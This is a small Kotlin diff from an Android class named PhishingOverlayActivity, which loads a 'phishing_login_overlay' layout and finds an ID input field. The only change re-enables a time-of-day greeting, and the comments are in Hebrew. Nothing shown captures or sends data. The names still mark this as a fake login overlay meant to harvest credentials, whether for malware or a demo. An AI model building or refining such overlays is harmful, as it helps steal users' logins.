@@ -39,7 +39,7 @@ class PhishingOverlayActivity : Activity() {
         setContentView(R.layout.phishing_login_overlay)
 
         // קביעת ברכה לפי השעה
-        //setDynamicGreeting()
+        setDynamicGreeting()
 
         // מוצאים את הרכיבים
         val idField = findViewById<EditText>(R.id.id_field)
